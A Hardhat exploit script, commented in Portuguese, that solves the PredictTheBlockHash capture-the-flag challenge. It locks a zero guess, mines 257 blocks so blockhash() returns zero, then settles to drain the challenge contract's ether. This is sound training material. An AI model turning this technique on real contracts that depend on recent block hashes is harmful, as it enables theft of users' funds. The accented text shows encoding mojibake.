const hre = require("hardhat");

async function main() {
  console.log("üîç Iniciando exploit do PredictTheBlockHashChallenge...\n");

  // O endere√ßo do contrato pode ser passado como vari√°vel de ambiente
  let contractAddress = process.env.CONTRACT_ADDRESS;
  
  if (!contractAddress) {
    console.log("üì¶ Nenhum endere√ßo fornecido. Fazendo deploy do contrato...\n");
    
    const [deployer] = await hre.ethers.getSigners();
    
    // Deploy do contrato enviando 1 ether
    const PredictTheBlockHashChallenge = await hre.ethers.getContractFactory("challenges/08_lottery_predict_block_hash/contracts/PredictTheBlockHashChallenge.sol:PredictTheBlockHashChallenge");
    const challenge = await PredictTheBlockHashChallenge.deploy({
      value: hre.ethers.parseEther("1.0")
    });
    await challenge.waitForDeployment();
    contractAddress = await challenge.getAddress();
    
    console.log("‚úÖ Contrato deployado em:", contractAddress);
    console.log("");
  }

  // Conectar ao contrato
  const PredictTheBlockHashChallenge = await hre.ethers.getContractFactory("challenges/08_lottery_predict_block_hash/contracts/PredictTheBlockHashChallenge.sol:PredictTheBlockHashChallenge");
  const contract = PredictTheBlockHashChallenge.attach(contractAddress);

  // Obter contas
  const [attacker] = await hre.ethers.getSigners();
  
  // Verificar estado antes do exploit
  const balanceBefore = await hre.ethers.provider.getBalance(contractAddress);
  const isCompleteBefore = await contract.isComplete();
  
  console.log("üìç Endere√ßo do contrato:", contractAddress);
  console.log("üë§ Atacante:", attacker.address);
  console.log("");
  console.log("üìä Estado antes do exploit:");
  console.log("  - Saldo do contrato:", hre.ethers.formatEther(balanceBefore), "ETH");
  console.log("  - Desafio completo:", isCompleteBefore);
  console.log("");

  if (isCompleteBefore) {
    console.log("‚úÖ O desafio j√° est√° completo!");
    return;
  }

  // VULNERABILIDADE: block.blockhash() s√≥ funciona para os √∫ltimos 256 blocos
  // Para blocos mais antigos, retorna 0x0
  // Estrat√©gia: fazer lock com 0x0 e esperar mais de 256 blocos
  
  console.log("üîç Deployando contrato atacante...\n");
  
  const Attacker = await hre.ethers.getContractFactory("challenges/08_lottery_predict_block_hash/contracts/Attacker.sol:Attacker");
  const attackerContract = await Attacker.deploy(contractAddress);
  await attackerContract.waitForDeployment();
  const attackerAddress = await attackerContract.getAddress();
  
  console.log("‚úÖ Contrato atacante deployado em:", attackerAddress);
  console.log("");

  // Obter o bloco atual
  const currentBlock = await hre.ethers.provider.getBlock("latest");
  console.log("üìä Bloco atual:", currentBlock.number);
  console.log("");

  // Fazer lock com 0x0 (bytes32 zero)
  // Como block.blockhash() s√≥ funciona para os √∫ltimos 256 blocos,
  // se esperarmos mais de 256 blocos, block.blockhash(settlementBlockNumber) retornar√° 0x0
  const zeroHash = "0x0000000000000000000000000000000000000000000000000000000000000000";
  
  console.log("üéØ Fazendo lock com hash zero (0x0)...");
  console.log("   Estrat√©gia: Esperar mais de 256 blocos para que block.blockhash() retorne 0x0\n");
  
  const lockTx = await attackerContract.lockInGuess(zeroHash, {
    value: hre.ethers.parseEther("1.0")
  });
  console.log("üì§ Lock transaction enviada:", lockTx.hash);
  await lockTx.wait();
  console.log("‚úÖ Lock confirmado!\n");
  
  // Obter informa√ß√µes do bloco do lock
  const lockReceipt = await hre.ethers.provider.getTransactionReceipt(lockTx.hash);
  const lockBlock = await hre.ethers.provider.getBlock(lockReceipt.blockNumber);
  const settlementBlockNumber = lockBlock.number + 1;
  
  console.log("üìä Informa√ß√µes do lock:");
  console.log("  - Bloco do lock:", lockBlock.number);
  console.log("  - Settlement block number:", settlementBlockNumber);
  console.log("  - Hash do lock: 0x0");
  console.log("");

  // Esperar mais de 256 blocos
  // block.blockhash() s√≥ funciona para os √∫ltimos 256 blocos
  // Para blocos mais antigos, retorna 0x0
  const requiredBlocks = 257; // Precisamos de mais de 256 blocos
  
  console.log(`‚è≥ Minerando ${requiredBlocks} blocos para que block.blockhash() retorne 0x0...`);
  console.log("   (block.blockhash() s√≥ funciona para os √∫ltimos 256 blocos)\n");
  
  let blocksMined = 0;
  while (blocksMined < requiredBlocks) {
    // Minerar um bloco
    await attacker.sendTransaction({ to: attacker.address, value: 0 });
    blocksMined++;
    
    if (blocksMined % 50 === 0) {
      const latestBlock = await hre.ethers.provider.getBlock("latest");
      console.log(`   Minerados ${blocksMined} blocos (bloco atual: ${latestBlock.number})...`);
    }
  }
  
  const finalBlock = await hre.ethers.provider.getBlock("latest");
  console.log(`\n‚úÖ ${blocksMined} blocos minerados!`);
  console.log(`   Bloco atual: ${finalBlock.number}`);
  console.log(`   Settlement block: ${settlementBlockNumber}`);
  console.log(`   Diferen√ßa: ${finalBlock.number - settlementBlockNumber} blocos`);
  console.log("");

  // Verificar que block.blockhash(settlementBlockNumber) retorna 0x0
  const blockHash = await hre.ethers.provider.getBlock(settlementBlockNumber);
  if (blockHash) {
    // Tentar obter o hash usando uma chamada de view
    // Em Hardhat, podemos verificar diretamente
    console.log("üîç Verificando se block.blockhash(settlementBlockNumber) retorna 0x0...");
    
    // Como estamos em Hardhat, vamos tentar chamar settle() diretamente
    // O contrato vai calcular block.blockhash(settlementBlockNumber) que deve retornar 0x0
    console.log("üì§ Chamando settle()...\n");
    
    const settleTx = await attackerContract.settle();
    await settleTx.wait();
    console.log("‚úÖ Settle confirmado!");
  }

  // Verificar estado ap√≥s o exploit
  const balanceAfter = await hre.ethers.provider.getBalance(contractAddress);
  const isCompleteAfter = await contract.isComplete();
  
  console.log("\nüìä Estado ap√≥s o exploit:");
  console.log("  - Saldo do contrato:", hre.ethers.formatEther(balanceAfter), "ETH");
  console.log("  - Desafio completo:", isCompleteAfter);
  
  if (isCompleteAfter) {
    console.log("\nüéâ Desafio completado! O hash do bloco foi previsto corretamente");
    console.log("üí∞ Voc√™ recebeu 2 ether de volta (1 ether enviado + 1 ether de lucro)");
    console.log("\nüí° A vulnerabilidade: block.blockhash() s√≥ funciona para os √∫ltimos 256 blocos.");
    console.log("   Para blocos mais antigos, retorna 0x0, permitindo prever o hash!");
  } else {
    console.log("\n‚ùå Algo deu errado. O desafio n√£o foi completado.");
    console.log("üí° Verifique se esperou mais de 256 blocos ap√≥s o lock.");
  }
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });

